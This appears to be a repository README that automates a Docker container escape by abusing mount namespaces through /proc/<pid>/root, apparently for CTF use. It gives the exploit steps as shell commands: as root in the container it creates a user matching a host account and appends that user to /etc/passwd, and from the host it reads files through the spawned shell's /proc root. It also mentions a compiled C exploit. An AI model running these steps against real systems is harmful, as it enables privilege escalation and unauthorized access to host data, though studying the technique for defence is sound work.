# Abusing mount namespaces through /proc/*PID*/root

In this repository I come to automate the namespace technique to escape from a Docker and elevate privileges/remove the flag/dump data, etcetera. You can read in more detail this technique [here](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot). In order to perform this technique successfully you need to fulfill the following requirements.

- Shell as non-privileged user on host
- Shell as root on the Docker.

Exploit:

**The following steps you must run them in the Docker as root.

``` shell
useradd luk4s # This user must exist on the host machine.
usermod -aG luk4s luk4s
echo "luk4s:x:1000:1000:luk4s:/home/luk4s:/bin/bash" >> /etc/passwd # The content can be taken out of the machine host -> grep luk4s /etc/paswd
su luk4s
/bin/sh # We run this command when we gain shell as luk4s in the container
```

With this we are ready to work on the container.

**The following commands must be executed from the hosts machine.**

``` shell
ps aux | grep sh # You will notice a process that runs your user with a sh, this was the process you created in the container
grep -a "flag" /proc/<pid>/root/sda
```

PoC:

![](https://i.imgur.com/7FyR5qG.png)

## Automation

Program a C script which automates the steps to follow in the container, if you want to use the binary you compile it using `gcc` and upload it to Docker.

``` shell
gcc exploit.c -o exploit
```
